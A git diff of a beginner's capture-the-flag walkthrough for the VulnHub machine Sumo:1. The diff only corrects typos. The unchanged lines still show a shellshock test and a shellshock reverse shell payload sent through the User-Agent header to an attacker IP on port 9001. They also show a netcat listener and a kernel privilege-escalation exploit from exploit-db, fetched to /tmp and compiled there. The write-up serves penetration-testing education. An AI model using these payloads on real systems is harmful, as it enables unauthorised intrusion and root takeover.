@@ -13,7 +13,7 @@ paginate: false
 keywords: sumo, sumo 1 vulnhub, vulnhub, sumo vulnhub walkthrough, sumo vulnhub writeup, vulnhub sumo, infosec articles, sumo vulnhub writeup
 ---
 
-Today we will be doing Sumo:1 from Vulnhub. This machine is rated easy and good for beginners. This includes exploiting a shellshock vulnerability to get a reverse shell and then exploiting the old version kernel used by the VM to get root. I've add the IP to my hosts file, So Lets Begin!
+Today we will be doing Sumo:1 from Vulnhub. This machine is rated easy and good for beginners. This includes exploiting a shellshock vulnerability to get a reverse shell and then exploiting the old version kernel used by the VM to get root. I've added the IP to my hosts file, So Let's Begin!
 
 ```r
 root@kali:~# cat /etc/hosts
@@ -22,7 +22,7 @@ root@kali:~# cat /etc/hosts
 192.168.1.16    sumo.local
 ```
 
-## Inital Enumeration and User Shell
+## Initial Enumeration and User Shell
 
 I started the reconnaissance by running a port scan with Nmap, checking default scripts and testing for vulnerabilities.
 
@@ -49,11 +49,12 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 7.48 seconds
 ```
 
-We have a port 80 open which displays a default web server page says that "It Works!"
+We have a port 80 open which displays a default web server page that says "It Works!"
 
 <center><br>
 <img src="/assets/img/uploads/sumo/port80.png">
 </center>
+
 <p align="justify">
 Next I ran a gobuster scan to look for hidden directories, but didn't find anything interesting there. Then I performed a nikto scan to search for some web based vulnerabilities and found that this web server is vulnerable to <b>shellshock vulnerability.</b> </p>
 
@@ -85,7 +86,7 @@ root@kali:~# nikto -h sumo.local
 ---------------------------------------------------------------------------
 + 1 host(s) tested
 ```
-If you don't know about shellshock vulnerability, I recommend reading about it <a href="https://en.wikipedia.org/wiki/Shellshock_(software_bug)">here.</a> I tested the vulnerability by running <b>id</b> command.
+If you don't know about shellshock vulnerability, I recommend reading about it <a href="https://en.wikipedia.org/wiki/Shellshock_(software_bug)">here.</a> I tested the vulnerability by running the <b>id</b> command.
 ```r
 root@kali:~# curl -A "() { ignored; }; echo Content-Type: text/plain ; echo  ; echo ; /usr/bin/id" http://sumo.local/cgi-bin/test/test.cgi  
 
@@ -96,7 +97,7 @@ Excellent, We were able to exploit this vulnerability. Now I executed a payload 
 ```r
 root@kali:~# curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/192.168.1.6/9001 0>&1' http://sumo.local/cgi-bin/test/test.cgi  
 ```
-I opened a netcat listner on the other terminal and we got the reverse shell.
+I opened a netcat listener on the other terminal and we got the reverse shell.
 
 ```r
 root@kali:~# nc -lvnp 9001
@@ -110,7 +111,7 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 
 ## Root Shell
 <p align="justify">
-Getting root on this machine was quite easy and straight forward. This machine is a using an old version of kernel. There are many exploits available to escalate the privileges. One of the most famous is Dirty Cow but I won't be using it here.
+Getting root on this machine was quite easy and straightforward. This machine is using an old version of kernel. There are many exploits available to escalate the privileges. One of the most famous is Dirty Cow but I won't be using it here.
 </p>
 
 ```r
@@ -119,7 +120,7 @@ uname -a
 Linux ubuntu 3.2.0-23-generic #36-Ubuntu SMP Tue Apr 10 20:39:51 UTC 2012 x86_64 x86_64 x86_64 GNU/Linux
 ```
 
-Instead I used <a href="https://www.exploit-db.com/exploits/33589"> this exploit</a> from exploitdb. I downloaded this exploit on my host machine and started a python http server and tranferred it to the target machine in the tmp directory.
+Instead I used <a href="https://www.exploit-db.com/exploits/33589"> this exploit</a> from exploitdb. I downloaded this exploit on my host machine and started a python http server and transferred it to the target machine in the tmp directory.
 
 ```r
 www-data@ubuntu:/usr/lib/cgi-bin$ cd /tmp
@@ -136,13 +137,13 @@ Saving to: `33589.c'
      0K ...         100%  242M=0s
 2020-06-16 03:50:50 (242 MB/s) - `33589.c' saved [3664/3664]
 ```
-Then I tried to complite the exploit but it gave an error. This error can be fixed by updating the path variables using the following command:
+Then I tried to compile the exploit but it gave an error. This error can be fixed by updating the path variables using the following command:
 
 ```r
 www-data@ubuntu:/tmp$ PATH=PATH$:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/lib/gcc/x86_64-linux-gnu/4.8/;export PATH   
 ```
 
-This time the exploit complied without any errors, I gave the exploit executable permissions and after running the exploit, we were root!  
+This time the exploit compiled without any errors, I gave the exploit executable permissions and after running the exploit, we were root!  
 
 ```r
 www-data@ubuntu:/tmp$ gcc 33589.c -O2 -o exploit
